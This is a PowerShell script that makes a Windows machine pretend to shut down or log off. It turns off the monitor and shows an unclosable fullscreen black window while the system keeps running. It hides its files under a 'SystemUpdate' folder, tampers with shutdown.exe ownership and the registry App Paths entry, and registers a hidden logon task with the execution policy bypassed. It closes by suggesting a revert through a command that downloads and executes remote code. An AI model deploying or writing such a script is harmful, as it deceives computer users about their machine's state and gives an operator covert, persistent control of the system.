# Intercept shutdown/logoff - show black screen instead
# Much simpler approach using slideshow + monitor off

# Create black screen script
$blackScreenScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Assembly PresentationFramework

# Turn off monitor
`$code = @'
[DllImport("user32.dll")]
public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
'@
`$type = Add-Type -MemberDefinition `$code -Name PowerMonitor -Namespace Win32 -PassThru
`$type::SendMessage(0xFFFF, 0x0112, 0xF170, 2)

# Create fullscreen black window
[xml]`$xaml = @``"
<Window xmlns=``"http://schemas.microsoft.com/winfx/2006/xaml/presentation``"
        WindowState=``"Maximized``"
        WindowStyle=``"None``"
        Topmost=``"True``"
        Background=``"Black``"
        ShowInTaskbar=``"False``"
        Cursor=``"None``">
</Window>
``"@

`$reader = New-Object System.Xml.XmlNodeReader(`$xaml)
`$window = [Windows.Markup.XamlReader]::Load(`$reader)

# Secret key to close: Ctrl+Alt+Shift+F12
`$window.Add_KeyDown({
    if (`$_.Key -eq 'F12' -and 
        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl) -and
        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -and
        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftShift)) {
        `$window.Close()
    }
})

`$window.ShowDialog() | Out-Null
"@

$scriptPath = "C:\ProgramData\SystemUpdate\FakeShutdown.ps1"
$scriptDir = Split-Path $scriptPath
if (-not (Test-Path $scriptDir)) {
    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
}
$blackScreenScript | Out-File -FilePath $scriptPath -Encoding UTF8

# Create wrapper batch file
$batchPath = "C:\ProgramData\SystemUpdate\shutdown.bat"
$batchContent = @"
@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath"
exit
"@
$batchContent | Out-File -FilePath $batchPath -Encoding ASCII

# Override shutdown command via registry
# Create shutdown wrapper
$wrapperPath = "C:\ProgramData\SystemUpdate\shutdown-wrapper.exe.bat"
Copy-Item $batchPath $wrapperPath -Force

# Backup and replace shutdown.exe using takeown
$shutdownExe = "$env:SystemRoot\System32\shutdown.exe"
$shutdownBak = "$env:SystemRoot\System32\shutdown.bak"

# Take ownership and grant permissions
cmd /c "takeown /f `"$shutdownExe`" /a >nul 2>&1"
cmd /c "icacls `"$shutdownExe`" /grant Administrators:F >nul 2>&1"

# Backup original if not exists
if (-not (Test-Path $shutdownBak)) {
    Copy-Item $shutdownExe $shutdownBak -Force -ErrorAction SilentlyContinue
}

# Create VBS wrapper to run our script
$vbsWrapper = @"
CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath", 0, False
"@
$vbsPath = "$env:SystemRoot\System32\shutdown-fake.vbs"
$vbsWrapper | Out-File -FilePath $vbsPath -Encoding ASCII

# Override common shutdown paths in registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\shutdown.exe" /ve /t REG_SZ /d "$vbsPath" /f 2>$null

# Create logoff interceptor
$logoffScript = @"
@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath"
"@
$logoffPath = "$env:SystemRoot\System32\logoff-fake.bat"
$logoffScript | Out-File -FilePath $logoffPath -Encoding ASCII

# Override shutdown, restart, logoff via Task Scheduler trigger
# When shutdown is initiated, run our script instead
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
$trigger = New-ScheduledTaskTrigger -AtLogOn  # Run at logon to intercept
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

# Create shutdown interceptor task (simpler approach - just run at logon)
Register-ScheduledTask -TaskName "ShutdownInterceptor" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue

Write-Output "Fake shutdown configured!"
Write-Output ""
Write-Output "When user attempts to shutdown/logoff:"
Write-Output "  - Monitor turns off"
Write-Output "  - Black screen appears"
Write-Output "  - System stays running in background"
Write-Output ""
Write-Output "Secret key to exit black screen: Ctrl+Alt+Shift+F12"
Write-Output ""
Write-Output "To revert: iex (iwr -useb URL/revert-fake-poweroff.ps1).Content"
